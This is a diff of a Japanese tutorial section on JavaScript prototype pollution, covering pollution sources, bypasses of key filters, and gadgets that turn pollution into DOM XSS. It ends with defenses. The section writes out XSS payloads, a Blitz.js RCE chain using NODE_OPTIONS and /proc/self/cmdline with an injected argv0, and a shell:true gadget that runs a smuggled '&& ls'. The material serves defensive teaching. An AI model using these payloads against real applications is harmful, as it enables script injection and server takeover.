+本節で見てきたように、クライアントサイド・プロトタイプ汚染によるXSSは「プロパティ名の検証漏れ（汚染フェーズ）」と「オブジェクトの形状を無条件に信頼するコード（ガジェットフェーズ）」という、独立した2つの弱点が組み合わさって初めて成立します。したがって攻撃者視点では、対象サイトがどのライブラリを読み込んでいるかをまず特定し（フィンガープリンティング）、そのライブラリが上記のようなCVEやガジェットカタログに載っていないかを照合する、という手順が典型的な調査フローになります。次節以降では、この汚染とガジェットの組み合わせをブラウザ上で自動的に探索してくれるツールである**DOM Invader**を使った実践的な検出方法を扱います。
 
 ---
 
 ## プロトタイプ汚染 実践とRCE事例
 
-これまでの章で扱ってきたXSSは、攻撃者が入力した文字列がそのままHTMLやJavaScriptとして**sink**（入力が最終的に実行・解釈される危険な代入先。例: `innerHTML`, `eval`, `document.write`）に流れ込むことで発火するものでした。本節で扱う**プロトタイプ汚染（Prototype Pollution, PP）**は、これとは質的に異なる脆弱性です。攻撃者は文字列を直接実行させるのではなく、JavaScriptの言語仕様そのもの――**プロトタイプチェーン**というオブジェクトの継承の仕組み――を汚染し、アプリケーションが「当然安全なはず」と信じているデフォルト値やオプション値を密かに差し替えます。汚染そのものは無害に見えますが、汚染された値を読み出して実行してしまう既存コード（**gadget**、汚染された値を実際の攻撃に変換するコード片）と組み合わさった瞬間、XSSやリモートコード実行（RCE）に発展します。
+前節（s4f）では、プロトタイプ汚染（prototype pollution）の原理 ―― `Object.prototype` に攻撃者が任意プロパティを書き込むと、そのプロセス内のほぼ全オブジェクトがその値を「継承」してしまう ―― と、汚染をXSSやRCEに変換する「ガジェット」というカタログを概観しました。本節はその続きで、実際に **どうやって汚染を仕込み（source）、どうやってそれを実害に着火させるか（sink/gadget）** という攻撃の一連の流れを、クライアントサイドのDOM XSSからサーバサイドのRCE（remote code execution、遠隔任意コード実行）まで、具体的な事例とペイロードで追いかけます。
 
-### 4-1. プロトタイプ汚染の仕組み（原理編）
+プロトタイプ汚染は「単体では何も起きない脆弱性」である点が特徴です。`Object.prototype.foo = 'x'` を実現できても、その `foo` を読み取って危険な処理を行うコード（ガジェット）がアプリやライブラリのどこかに存在しなければ、攻撃は成立しません。したがって実践では常に **「汚染の入口（source）」×「着火点（gadget/sink）」の二段構え** で考えます。本節はこの二段を、原典のペイロードを引用しながら組み立てていきます。
 
-JavaScriptのすべてのオブジェクトは、暗黙のリンクである `[[Prototype]]`（多くの実装で `__proto__` プロパティとして参照可能）を通じて別のオブジェクトに連結されています。`obj.foo` というプロパティアクセスが行われたとき、エンジンはまず `obj` 自身が `foo` を持つか（own property）を調べ、なければ `obj.__proto__`、さらにその `__proto__`……という具合に**プロトタイプチェーン**を辿ります。この連鎖の終点にあるのが `Object.prototype` で、素のオブジェクトリテラル `{}` を含め、ほぼすべてのオブジェクトは最終的にここへたどり着きます。
+> 学習の前提: 本節はラボの解答手順そのものではなく、脆弱性クラスの原理・攻撃面・防御を理解するための解説です。攻撃コードは「なぜ動くのか」を説明するために掲げます。
 
-問題は、**再帰的なマージ・クローン処理**（例: `lodash.merge`、`$.extend`、自作の `deepMerge` 関数）や、クエリ文字列・JSONを `key.subkey.subsubkey` のようなパスに分解してオブジェクトへ書き込む処理にあります。攻撃者がキーとして `__proto__`（あるいは `constructor.prototype`）を送り込むと、本来は「新しいプロパティを追加するだけ」のつもりだったコードが、実際には `Object.prototype` に対して書き込みを行ってしまいます。
+---
+
+### 汚染の入口（source）を体系的に理解する
+
+クライアントサイドで最も一般的な汚染の入口は、**攻撃者が制御できる文字列（URLのクエリ・フラグメント、`postMessage` で届くJSON、`localStorage` の値など）を、キー名を検証せずにオブジェクトへ展開するコード** です。代表的なアンチパターンは三つあります。
+
+#### (1) クエリ文字列パーサ（bracket記法の展開）
+
+Beyond XSS が示す典型的な脆弱パーサは、`a[b][c]=1` のようなネストしたキーをオブジェクトに再構築します。
 
 ```javascript
-function merge(target, source) {
-  for (const key in source) {
-    if (typeof source[key] === 'object') {
-      if (!target[key]) target[key] = {};
-      merge(target[key], source[key]); // 再帰
-    } else {
-      target[key] = source[key];
+function parseQs(qs) {
+  let result = {};
+  let arr = qs.split("&");
+  for (let item of arr) {
+    let [key, value] = item.split("=");
+    let items = key.split("[");
+    let obj = result;
+    for (let i = 0; i < items.length; i++) {
+      let objKey = items[i].replace(/]$/g, "");
+      if (i === items.length - 1) {
+        obj[objKey] = value;          // 最終要素だけ代入
+      } else {
+        if (typeof obj[objKey] !== "object") {
+          obj[objKey] = {};           // 途中は空オブジェクトを作って潜る
+        }
+        obj = obj[objKey];
+      }
     }
   }
-  return target;
+  return result;
 }
-
-merge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
-// => これ以降、あらゆる空オブジェクト {} が isAdmin === true を持つ
-console.log({}.isAdmin); // true
+var qs = parseQs("__proto__[a]=3");
 ```
 
-なぜこれが「なぜ動くか」というと、`for...in` ループは列挙可能なプロパティを列挙し、`target["__proto__"]` への代入はブラケット記法であってもJavaScriptエンジン内部では「このオブジェクトのプロトタイプを差し替える」特別な意味を持つためです（`Object.prototype.__proto__` はアクセサプロパティとして定義されている）。結果として、`merge` 関数はローカル変数を汚したつもりが、グローバルに共有される `Object.prototype` そのものを書き換えてしまいます。以降、アプリケーション中の**あらゆる**素のオブジェクトが `isAdmin: true` を継承します。
+**なぜ汚染できるのか。** キー `__proto__[a]` は `["__proto__", "a]"]` に分割され、ループの1周目で `obj = result["__proto__"]` を取得します。ここで `result["__proto__"]` は `result` の *プロトタイプ* すなわち `Object.prototype` を指すため、以後 `obj` は `Object.prototype` になります。2周目で `obj["a"] = "3"`、つまり `Object.prototype.a = "3"` が実行される。以後、このページ内で作られるあらゆる普通のオブジェクト `x` は、自分自身に `a` を持たなくても `x.a` を読むと `"3"` を返すようになります。これが「汚染」です。攻撃URLは `https://victim/?__proto__[a]=3` のように、ユーザー操作なしに送りつけられます。
 
-汚染自体は「値が勝手に増える」だけなので即座には害がありません。実害を生むのは、汚染されたプロパティを**チェックなしで信頼して読む**コード、すなわち **gadget** です。
+> 出典: Beyond XSS — Prototype Pollution — https://aszx87410.github.io/beyond-xss/en/ch3/prototype-pollution/
 
-### 4-2. クライアントサイドPPからXSSへ
+#### (2) 再帰的マージ（deep merge / merge）
 
-> 出典: HackTricks — Client Side Prototype Pollution — https://hacktricks.wiki/en/pentesting-web/deserialization/nodejs-proto-prototype-pollution/client-side-prototype-pollution.html
-
-#### 汚染源（sources）とgadgetの分離モデル
-
-HackTricksはクライアントサイドPPを「**汚染源**」と「**gadget**」の二段構成で捉えることを推奨しています。汚染源として典型的なのは次の4つです。
-
-- `location.hash` / `location.search`（URLのクエリ文字列やフラグメントをパースしてオブジェクト化する処理）
-- `postMessage`（クロスオリジンメッセージングで受け取ったJSONをマージする処理）
-- フォームシリアライザー（フォーム入力値をオブジェクト化するライブラリ）
-- 複数オブジェクトを統合するJSONマージ処理
-
-攻撃者はまずURL一つで完結する汚染源を探します。典型的な悪用URLは次の形です。
-
-```
-https://victim.example/?__proto__[transport_url]=data:,alert(1)//
-```
-
-これがフレームワーク側のクエリパーサ（`qs` や自作パーサ）によって `{__proto__: {transport_url: "data:,alert(1)//"}}` へ変換され、`Object.prototype.transport_url` が汚染されます。
-
-#### 代表的なgadgetパターン
-
-**gadget例1: `fetch()` のオプションオブジェクト経由**
+設定オブジェクトにユーザ設定を「深く合成」する `merge` 系関数も定番の入口です。
 
 ```javascript
-Object.prototype.body = "name=<img src=x onerror=alert(1)>";
-fetch("/endpoint", { method: "POST" }); // bodyを明示していない
+function merge(a, b) {
+  for (let prop in b) {
+    if (typeof a[prop] === "object") {
+      merge(a[prop], b[prop]);        // 子オブジェクトを再帰的に合成
+    } else {
+      a[prop] = b[prop];
+    }
+  }
+}
+var customConfig = JSON.parse('{"__proto__": {"a": 1}}');
+merge(config, customConfig);
 ```
 
-`fetch` の第2引数オブジェクトに `body` プロパティが存在しなければ、JavaScriptのプロパティ探索がプロトタイプチェーンを辿り、汚染された `body` を継承してしまいます。これは「オブジェクトのown propertyしかチェックしない」設計と「未指定オプションはプロトタイプ由来でも読み込まれる」というJS仕様の組み合わせが原因です。
+**なぜ汚染できるのか。** `for...in` は列挙可能プロパティを回します。`JSON.parse` で作られたオブジェクトの `__proto__` は（リテラルと違い）**通常の自前プロパティとして** `{"a":1}` を保持しています。`merge` はこれを `typeof a["__proto__"] === "object"` と判定して再帰に入り、`a["__proto__"]`（= `Object.prototype`）に対して `a = 1` を書き込みます。`lodash.merge` の旧版をはじめ、多数のライブラリが同型のバグで CVE を出しました。ポイントは **`JSON.parse` 経由だと `__proto__` がデータとして通る** ことで、これが後述のサーバサイド攻撃でも鍵になります。
 
-**gadget例2: `Object.defineProperty` の記述子欠落**
+> 出典: Beyond XSS — Prototype Pollution — https://aszx87410.github.io/beyond-xss/en/ch3/prototype-pollution/
+
+#### (3) パス指定代入（`set(obj, "a.b.c", value)`）
+
+`lodash.set` のように「`a.b.c` という文字列パスで深い位置へ代入する」ユーティリティも、パスに `__proto__.x` や `constructor.prototype.x` を渡されると汚染します。この形式は特に **サーバサイド** のデシリアライズやORM、フォーム処理で頻出し、後述の Blitz.js の RCE がまさにこの型です。
+
+---
+
+### 代替ベクタ ―― `__proto__` を弾かれても汚染する
+
+防御側は往々にして「キーが `__proto__` だったら拒否」というブラックリストを書きます。しかしプロトタイプチェーンには `__proto__` 以外の入口があり、さらにブラックリスト自体の実装ミスも突けます。
+
+- **`constructor.prototype` 経由**: 任意オブジェクト `o` について `o.constructor` は生成元コンストラクタ（`Object`）を、`o.constructor.prototype` は `Object.prototype` を指します。したがって `obj["constructor"]["prototype"]["a"] = 1` は `__proto__` を一切使わずに同じ汚染を達成します。クエリなら `?constructor[prototype][a]=1` です。
+
+  ```javascript
+  obj["constructor"]["prototype"]["a"] = 1;  // __proto__ を使わない汚染
+  ```
+
+- **不完全なサニタイズの潰し込み**: 「文字列から `__proto__` を1回だけ除去する」実装は、`__pro__proto__to__` のような入力を1回除去すると中央の `__proto__` が消えて残った両端が結合し、`__proto__` に戻ってしまいます。除去は「一致しなくなるまで繰り返す」か、そもそもキーの完全一致で拒否する必要があります。
+
+> 出典: PortSwigger Web Security Academy — Client-side prototype pollution — https://portswigger.net/web-security/prototype-pollution/client-side
+
+---
+
+### 汚染をDOM XSSに変える（クライアントサイドのガジェット）
+
+入口を確保したら、次はそのプロパティを読んで危険な副作用を起こす **ガジェット** を探します。ガジェットは「本来は自前で持っていないはずのオプションを、コードが `if (config.xxx)` のように確認してしまう」箇所に潜みます。
+
+#### 素朴な例 ―― 存在チェックの裏をかく
+
+HackTricks が挙げる最小例です。
 
 ```javascript
-Object.prototype.value = '<img src=x onerror=alert(1)>';
-const victim = {};
-Object.defineProperty(victim, "html", { configurable: false, writable: false });
+Object.prototype.innerHTML = "<img src=x onerror=alert(1)>";
+function createElement(config) {
+  const element = document.createElement(config.tag);
+  if (config.innerHTML) {          // 汚染により常に truthy
+    element.innerHTML = config.innerHTML;   // sink: 汚染値がそのまま入る
+  } else {
+    element.innerText = config.innerText;   // 本来通るはずの安全な枝
+  }
+  return element;
+}
 ```
 
-`defineProperty` の第3引数（プロパティ記述子）に `value` キーが明示されていない場合、デフォルトで `undefined` になるのではなく、プロトタイプ経由の値を継承する実装が存在し、意図しない値が設定されます。
+**なぜ動くのか。** 呼び出し側は `config` に `innerHTML` を入れていないため、開発者は「安全な `innerText` 側が実行される」と信じています。しかし `Object.prototype.innerHTML` を汚染しておくと `config.innerHTML` が継承値で truthy になり、危険な `innerHTML` 側の枝が選ばれ、しかもその値は攻撃者制御の HTML です。`onerror` により `alert(1)` 相当のスクリプトが走ります。これが「安全なはずの分岐」を汚染で反転させるガジェットの本質です。
 
-**gadget例3: サニタイザーのホワイトリスト設定の汚染**
+#### テンプレートエンジン・サニタイザのガジェット
 
-```html
-<script>
-  Object.prototype["* ONERROR"] = 1;
-  Object.prototype["* SRC"] = 1;
-</script>
-<script src="https://google.github.io/closure-library/source/closure/goog/base.js"></script>
-```
-
-一部のHTMLサニタイザー（`sanitize-html`, DOMPurify等）は「許可するタグ・属性」の設定をオブジェクトのプロパティとして保持しています。この設定オブジェクトが `hasOwnProperty` によるチェックを経ずに参照されると、攻撃者はプロトタイプ経由で「`onerror` 属性を許可する」設定を割り込ませ、サニタイズをすり抜けさせられます。これはCSP（Content Security Policy）やDOMPurifyが「入力文字列」だけを検査対象にしており、「サニタイザー自身の設定オブジェクトの整合性」までは検査しないという盲点を突くものです。
-
-#### 検出ツールとデバッグ手法
-
-実務では、DOM InvaderやBurp Suite、`ppfuzz`/`ppmap`/`proto-find`のような自動化ツールで汚染可能な入力を探索したのち、以下のようなアクセサ差し込みによって「どのコードが汚染プロパティを読んでいるか」をスタックトレースで特定します。
+- **Vue.js**: `Object.prototype.template = "<svg onload=alert(1)></svg>"` を汚染しておくと、`new Vue({el:"#app", data:{...}})` がインスタンスオプションから `template` を拾い、その中身をコンパイルして実行します（`template` はスクリプト実行に等しい）。
+- **sanitize-html のバイパス**: `Object.prototype.innerText = "<svg onload=alert(1)></svg>"` の汚染下で `document.write(sanitizeHtml("<div>hello</div>"))` を実行すると、サニタイザが内部で参照する `innerText` 継承値が出力に混ざり、消毒を経ずに危険タグが出ます。
 
 ```javascript
-Object.defineProperty(Object.prototype, "potentialGadget", {
-  __proto__: null,
-  get() {
-    console.trace(); // どこからアクセスされたかを可視化
-    return "test";
-  },
-});
+Object.prototype.template = "<svg onload=alert(1)></svg>";
+new Vue({ el: "#app", data: { message: "Hello" } });
 ```
 
-これにより、`get` トラップが発火した瞬間のコールスタックを確認でき、ライブラリコード中の「無検証読み出し箇所」を効率的に特定できます。
+> 出典: HackTricks — Client-side prototype pollution — https://hacktricks.wiki/en/pentesting-web/deserialization/nodejs-proto-prototype-pollution/client-side-prototype-pollution.html
 
-#### 2024年以降の研究動向
+#### 実在ライブラリの「野生のガジェット」
 
-HackTricksが引用するGaLAフレームワークの研究では、100万サイトを対象にクライアントサイドPPを走査し、**133個のゼロデイgadget**を発見、23サイトを「無害」から「実運用的にエクスプロイト可能」に変化させたと報告されています。重要な指摘は、**被害はXSSに限らない**という点です。Meta社の `fbevents.js` では汚染された配列要素が `document.cookie` に到達する事例が確認され、Vue.jsのgadgetは **CVE-2024-6783** として認定されました。したがって狩猟時は `innerHTML` や `script.src` だけでなく、`document.cookie` への書き込み、リダイレクト先URLの構築、`setTimeout`/`eval` への値渡しも確認対象に含める必要があります。
+PortSwigger の研究 *Widespread prototype pollution gadgets* は、広く使われる解析タグ/ライブラリに実在する具体的ガジェットを列挙しました。汚染するプロパティ名と、それが流れ込む sink の対応が重要です。
 
-#### 防御策
+| ライブラリ | 汚染プロパティ | sink（着火点） | 効果 |
+|---|---|---|---|
+| Google Analytics | `hitCallback` | `setTimeout` | コールバックとして関数文字列が実行 → DOM XSS |
+| Google Tag Manager | `sequence` | `eval` | 整数と並ぶJS式に混入 → コード実行 |
+| Google Tag Manager | `event_callback` | `setTimeout` | 同上 |
+| Adobe DTM | `cspNonce` | `innerHTML` | HTMLに混入 → DOM XSS |
+| Adobe DTM | `bodyHiddenStyle` | `innerHTML` | 同上 |
+| Adobe DTM | `trackingServerSecure` | `script.src` | ホスト部を制御 → 外部スクリプト読み込み |
 
-- プロパティアクセス前に `Object.prototype.hasOwnProperty.call(obj, key)` で own property であることを明示的に確認する。
-- オプションオブジェクトを生成する際は `Object.create(null)` を使い、そもそもプロトタイプを持たないオブジェクトにする。
-- 必須プロパティは呼び出し側で全て明示し、「未指定なら継承される」余地を作らない。
-- `JSON.parse` のリバイバーやマージ処理で `__proto__` / `constructor` / `prototype` というキー名を明示的に拒否する。
+**`script.src` ガジェットの意味。** `trackingServerSecure` を汚染すると、タグが動的に生成する `<script>` の `src` のホスト部を攻撃者が乗っ取れます（プロトコルは固定でも、任意ホストからJSを読める）。これは **CSP を回避する経路** にもなり得ます。CSP（Content Security Policy）が信頼済みホストを `script-src` に許可している場合、そのホストに攻撃者のJSを置ければ実行できてしまうためです（CSPは「どこから読むか」を制限するだけで、汚染で行き先が信頼済みホストにすり替わることまでは防げません）。
 
-### 4-3. Beyond XSS: URLだけで完結するPP起点のXSSチェーン
+> 出典: PortSwigger Research — Widespread prototype pollution gadgets — https://portswigger.net/research/widespread-prototype-pollution-gadgets
 
-> ⚠️ **未取得の資料に関する補足**: 「Beyond XSS — Prototype Pollution」（https://aszx87410.github.io/beyond-xss/en/ch3/prototype-pollution/）は、このセッションの環境からは直接取得できませんでした（理由: 当該ドメインがネットワークegressプロキシによりブロックされているため）。GitHub上のミラー取得も404で失敗しました。以下のURLからユーザーご自身で直接ご覧いただくことを推奨します: https://aszx87410.github.io/beyond-xss/en/ch3/prototype-pollution/
->
-> 以下はWeb検索で得られた要約情報と、（以下は未取得資料の補足として一般知識に基づく解説です）著者aszx87410氏の他章（DOM Clobbering章など、同シリーズ内で言及される関連概念)から構成した技術的解説です。原文の一次情報としては必ずリンク先をご確認ください。
+#### 実戦での検出 ―― DOM Invader
 
-Beyond XSSのPrototype Pollution章は、「攻撃者はJavaScriptを一切実行させずに、URLを一つ送るだけで被害者のブラウザ上でPP起点のXSSを成立させられる」という実践的な攻撃チェーンを解説しています。核となる考え方は次の通りです。
+手作業では「効く source を総当たりし、続いて `Object.prototype` を読む gadget を探す」という二段の探索になり、時間がかかります。Burp Suite の **DOM Invader** はこれを自動化します。URL と、web message（`postMessage`）で届くJSON の両方から source を自動検出し、代替ベクタ（`constructor.prototype` 等）も試します。さらにガジェット走査を行い、source・gadget・sink を結合して **DOM XSS の PoC を自動生成** できる場合があります。これにより、実サイトの調査が「数時間」から「数秒」へ短縮されます。防御の観点では「ブラウザAPIを呼ぶ際は null プロトタイプのオブジェクト（`Object.create(null)`）を使う」ことが有効な多層防御になります。
 
-1. **フロントエンドのルーティングライブラリやユーティリティ関数**（多くはURLのクエリ文字列を再帰的にオブジェクト化する）が汚染源になる。
-2. 被害者に `https://victim.example/?__proto__[foo]=bar` のようなURLを踏ませるだけで、被害者のブラウザ内で `Object.prototype` が汚染される。
-3. ページ内のどこかで `innerHTML` に代入されているオプション値（例: テンプレートエンジンやUIライブラリが「デフォルトHTML」として使う設定値）が、この汚染されたプロパティを継承し、結果としてペイロードが `innerHTML` に渡ってXSSが発火する。
+> 出典: PortSwigger — Testing for client-side prototype pollution (DOM Invader) — https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution
 
-これは反射型XSSと違い、**サーバー側の入力検証を一切経由しない**点が重要です。攻撃対象はサーバーのレスポンスではなく、クライアント側のJavaScriptコードの「オブジェクトの扱い方」そのものです。したがってサーバーサイドでどれだけ入力をエスケープしていても、フロントエンドのマージ・パース処理に脆弱性があれば防げません。また同章はDOM Clobbering（HTML要素のid/name属性がグローバル変数やDOM APIの結果を上書きする手法）とPPを組み合わせることで、CSPが有効な環境でも「script gadgetを踏ませてalert()相当のJS実行に到達できる」ケースにも言及しており、CSPは「外部スクリプトの読み込み元」を制限する仕組みであって、「読み込み済みJSコードのオブジェクト操作」までは防げないという原理的な限界を浮き彫りにしています。
+---
 
-### 4-4. Blitz.js プロトタイプ汚染によるRCE（サーバーサイド, 2022年公開）
+### 実世界のクライアントサイド事例
 
-> 出典: Sonar — Remote Code Execution via Prototype Pollution in Blitz.js — https://www.sonarsource.com/blog/blitzjs-prototype-pollution/
+- **HackerOne / Wistia embed（2020）**: 脆弱な `url.parse()` で `location.href` を解析する過程でプロトタイプ汚染が発生。Wistia 埋め込みの `fromObject()` ガジェットが、汚染された `innerHTML` を含む DOM プロパティを設定してしまい、DOM XSS に到達しました。**「解析ライブラリの汚染」×「埋め込みウィジェットのガジェット」** という典型的な二段構えです。
+- **Kibana CVE-2019-7609**: Timelion 機能で `.es.props(label.__proto__.x='ABC')` の形で `Object.prototype` を汚染でき、これを環境変数ガジェットと組み合わせ、`NODE_OPTIONS="--require /proc/self/environ"` を成立させて **サーバ上で任意コマンド実行** に到達しました。クライアント式の汚染入口からサーバRCEへ橋渡しした古典例です（この `NODE_OPTIONS`/`/proc/self` の技法は次のBlitz.jsでも中核になります）。
 
-**対象バージョン**: Blitz.js 0.x系（`superjson` を用いたRPC引数のデシリアライズ処理を持つバージョン）。**公開年**: 2022年7月。**修正状況**: Blitz.jsは `__proto__` / `constructor` / `prototype` をパス名として使用できないようブロックする形で修正済み。
+> 出典: HackTricks — Client-side prototype pollution — https://hacktricks.wiki/en/pentesting-web/deserialization/nodejs-proto-prototype-pollution/client-side-prototype-pollution.html
 
-Blitz.jsはNext.jsベースのフルスタックフレームワークで、フロントエンドからバックエンドの関数を直接呼び出せる「Zero-API」設計を特徴としています。この通信のシリアライズ形式として、標準の `JSON` を拡張した独自形式 **superjson** を使用しており、循環参照やDate・Map・Setなど、通常のJSONでは表現できない型をサポートするため、「メタデータとして**代入操作のパス一覧**を送り、受信側でそれをデータへ適用する」という設計になっていました。
+---
 
-#### 脆弱性の仕組み
+### サーバサイドRCE事例 ―― Blitz.js（CVE-2022-23631）
 
-superjsonのデシリアライズ処理は、リクエストに含まれるメタデータの中の**パス文字列を検証なしにオブジェクトへの代入操作として実行**していました。パスの各セグメントは任意のプロパティ名を取り得るため、攻撃者は次のようなパスを送信できます。
+クライアントサイドの汚染は多くがDOM XSSどまりですが、**Node.js サーバでの汚染は RCE に直結しうる** 点で危険度が段違いです。Sonar が公開した Blitz.js の解析は、その完全な攻撃連鎖（source からRCEまで）を示す教科書的事例です。
+
+#### 対象と修正状況
+
+- **CVE**: CVE-2022-23631（脆弱性は依存する `superjson` シリアライズライブラリにあった）
+- **影響版**: `superjson` < 1.8.1、Blitz.js < 0.45.3
+- **修正版**: `superjson` 1.8.1、Blitz.js 0.45.3（公開: 2022年）
+- **前提**: RPC を1つでも持つ Blitz.js アプリなら、**認証不要・ユーザ操作不要でリモートから** 成立しうる
+
+#### 入口 ―― superjson の `referentialEqualities`
+
+Blitz.js の RPC は、JSと同じ型情報（Date/Map/循環参照など）を保つために `superjson` でデータをシリアライズします。superjson は本体データ `json` とは別に、`meta.referentialEqualities` という **「このパスとこのパスは同じ参照だから、代入で結び直せ」という指示表** を持ちます。復元時、この指示に従って **パス文字列による代入** が行われます。記事の説明では、指示 `products[0].brand = brands[0]` 相当の代入が、パスの検証なしに実行されます。
+
+攻撃者が RPC エンドポイントへ送る悪性ペイロードは次の構造を取ります。
 
 ```json
 {
-  "json": { "data": "x" },
+  "json": { /* 攻撃者が制御するデータ本体 */ },
   "meta": {
-    "values": {
-      "__proto__.polluted": [["set"]]
+    "referentialEqualities": {
+      "__proto__.x": ["some.path"]
     }
   }
 }
 ```
 
-「代入先パスに任意のプロパティ名を指定できる」という設計が、パス中に `__proto__.x` を含めるだけで `Object.prototype.x` への書き込みを許してしまう、という典型的なPPの構図をサーバーサイドで再現しています。クライアントサイドの場合と原理は同一で、**再帰的なプロパティ書き込み処理が、パスの途中に現れる `__proto__` という名前を特別扱いせずそのまま辿ってしまう**ことが根本原因です。
+**なぜ汚染できるのか。** superjson は指示表のキー `"__proto__.x"` を「代入先パス」として解釈し、`json.__proto__.x = (some.path の値)` を実行します。`json.__proto__` は `Object.prototype` なので、これは `Object.prototype.x = 攻撃者制御値` に等しい。前述の「パス指定代入(3)」の型そのものが、信頼できない入力（RPC本文）で駆動される状況です。
 
-#### RCEへのエスカレーション
+> 出典: Sonar — Prototype Pollution in Blitz.js Leads to RCE — https://www.sonarsource.com/blog/blitzjs-prototype-pollution/
 
-汚染したプロパティ単体では任意コード実行にはなりません。Sonarのリサーチチームが発見したのは、**汚染されたJSONリクエストをサーバーへ送ると、Blitz.jsのルーティング機構が汚染済みのプロトタイプを保持した状態でサーバー側のJavaScriptモジュールを読み込む**という連鎖です。具体的には、Node.jsのモジュール解決やNext.jsのルーティング内部処理が、汚染されたプロパティ（例えばモジュールの設定やパス解決に使われる値）をチェックなしに利用しており、攻撃者はこれを使ってサーバー側で読み込まれるコードパスを操作し、最終的に**任意のシステムコマンド実行（RCE）**へとつなげることに成功しました。ここでの「なぜRCEに到達できるか」のポイントは、**プロトタイプ汚染 → 信頼された内部設定値のすり替え → その値を使ってサーバーが動的にコードや設定を読み込む** という「gadgetチェーンがサーバー内部の奥深く（モジュールローダーやルーター）にまで存在した」という点です。クライアントサイドの `innerHTML` gadgetと構造的には同じですが、到達点がブラウザではなくNode.jsプロセスであるためRCEに直結しました。
+#### 着火 ―― RCEへの三段ガジェット連鎖
 
-#### 修正
+汚染だけではまだRCEになりません。Sonar は Next.js/Blitz の実行環境に潜む3つのガジェットを連結しました。
 
-Blitz.jsは根本原因への対処として、代入操作のパスに `__proto__`、`constructor`、`prototype` という名前が現れた場合にそれを拒否するフィルタを実装しました。これにより、たとえsuperjsonの再帰的代入ロジック自体は変更せずとも、プロトタイプチェーンへ到達する経路そのものを塞ぐことで脆弱性を解消しています。この対処法は、クライアントサイドPPの防御策で述べた「危険なキー名の明示的な拒否」と本質的に同じ考え方であり、**PP対策は「汚染源での入口対策」と「gadget側での出口対策」の両方を行うのが理想的**であることを示す好例です。
+1. **pages manifest の汚染**: Next.js はページ一覧（pages manifest）を参照して該当モジュールを `require()` で読み込みます。この参照はプロトタイプ継承されたプロパティも拾うため、汚染で **存在しないはずのエントリを注入** でき、`require()` の対象（実行されるファイル）を攻撃者が操作できます。
+2. **CLI ラッパの子プロセス生成**: 経路の先に、Blitz の CLI ラッパが `spawn()` で子プロセスを起動する箇所があります。`spawn()` のオプション引数（第3引数のオブジェクト）は、明示指定がなければ `Object.prototype` から継承した値を拾います。
+3. **`spawn` オプションの汚染 → 引数・環境変数注入**: 汚染で `spawn` の `env`（環境変数）や `argv0`（プロセスの見かけ上の引数0）を制御します。
 
-### 4-5. まとめ: PPからXSS/RCEへの共通原理
+最終的に、次のような子プロセス起動へ持ち込みます。
 
-3つの資料に共通するのは、プロトタイプ汚染そのものは「オブジェクトへの書き込みバグ」に過ぎず、**実際の脅威度は、その汚染値をノーチェックで信頼して使う既存コード（gadget）の有無で決まる**という構図です。攻撃者視点では「汚染源を1つ見つける」ことと「gadgetを1つ見つける」ことは別々のスキルであり、両者を繋ぎ合わせて初めてPoCが成立します。防御側は、(1) `__proto__`/`constructor`/`prototype` を汚染源で明示的に拒否する、(2) gadget側では `hasOwnProperty` チェックや `Object.create(null)` でプロトタイプ継承を断つ、という**入口・出口の二重対策**を徹底することが、クライアントサイドXSSからサーバーサイドRCEまで共通して有効な防御になります。
+```
+execve("/proc/self/exe",
+       ["console.log('pwned!');//", "-c", "node …"],
+       { NODE_OPTIONS: "--require /proc/self/cmdline" })
+```
+
+**なぜこれでコードが走るのか。** ここが技法の核心です。
+
+- `NODE_OPTIONS=--require /proc/self/cmdline` は「Node起動時に `/proc/self/cmdline` を必ず require せよ」という指示です。
+- Linux の `/proc/self/cmdline` は **その実行中プロセス自身のコマンドライン引数** をヌル区切りで返す擬似ファイルです。`argv0` に `console.log('pwned!');//` を仕込んでおくと、`require` されるファイルの先頭に攻撃者のJSが現れます。
+- `require` された内容は Node が **JavaScript として実行** するため、`console.log('pwned!')` が走ります。後続の引数は `//` でコメントアウトされ、構文エラーを避けます。
+
+つまり「起動引数として渡した文字列を、`/proc/self/cmdline` 経由で自分自身に `require` させて実行する」という自己参照トリックで、**環境変数と引数の制御だけからコード実行** を達成しています（Kibana の `/proc/self/environ` と同系統の発想です）。結果は **認証不要のサーバ上任意コード実行** です。
+
+> 出典: Sonar — Prototype Pollution in Blitz.js Leads to RCE — https://www.sonarsource.com/blog/blitzjs-prototype-pollution/
+
+#### Node.jsの汎用RCEガジェット（child_process）
+
+Blitz.js のような複雑な連鎖でなくても、`child_process` のオプション汚染は単体で危険です。HackTricks の例:
+
+```javascript
+Object.prototype.shell = true;
+const result = child_process.spawnSync("echo", ["123 && ls"], { timeout: 1000 });
+// shell:true 継承により、echo の引数がシェル解釈され && ls が実行される
+```
+
+**なぜ動くのか。** `spawnSync` に `shell` を明示していないため、`shell` は `Object.prototype` から継承した `true` になります。`shell:true` だと引数が `/bin/sh -c` に渡され、`123 && ls` の `&& ls` がコマンド連結として実行されます。Node製アプリで「外部コマンドを固定引数で呼んでいるから安全」という思い込みを、汚染が崩す好例です。同様に `fetch` は `body`/`method` の汚染でGETをPOSTに変えられます。
+
+> 出典: HackTricks — Client-side prototype pollution — https://hacktricks.wiki/en/pentesting-web/deserialization/nodejs-proto-prototype-pollution/client-side-prototype-pollution.html
+
+---
+
+### 防御 ―― 入口を塞ぎ、着火を無効化する
+
+プロトタイプ汚染対策は「source を塞ぐ」「gadget/sink を無効化する」の両面で行います。
+
+- **危険キーの完全拒否**: マージ/パース/パス代入で `__proto__`・`constructor`・`prototype` を**完全一致で**弾く。Blitz.js の修正はまさにパスで使えるプロパティ名からこの3つを禁止しました。前述の `__pro__proto__to__` を避けるため、除去ではなく拒否を選ぶこと。
+- **null プロトタイプのオブジェクトを使う**: `const obj = Object.create(null)` はプロトタイプチェーンを持たないため、`obj.__proto__.a = 1` は汚染に至らず、また `obj.x` が継承値を拾うこともありません。設定オブジェクトやブラウザAPIに渡すオプションに有効。
+- **`Object.freeze(Object.prototype)`**: プロトタイプを凍結すると `Object.prototype.a = 1` は（strictでなければ）静かに失敗し、汚染が成立しません。ただし `Object.prototype` を書き換える正当なコードがあると壊れるため互換性検証が必要。
+- **Node.js 起動フラグ `--disable-proto`**: `--disable-proto=delete`/`=throw` で `__proto__` アクセサ自体を無効化・例外化できる。ただし `constructor.prototype` 経路は別途塞ぐ必要がある点に注意。
+- **スキーマ検証**: `Map` を使う、`JSON.parse` の reviver で許可キーのみ通す、あるいは Zod 等でRPC/入力を検証するなど、そもそも任意キーを受け付けない設計にする。
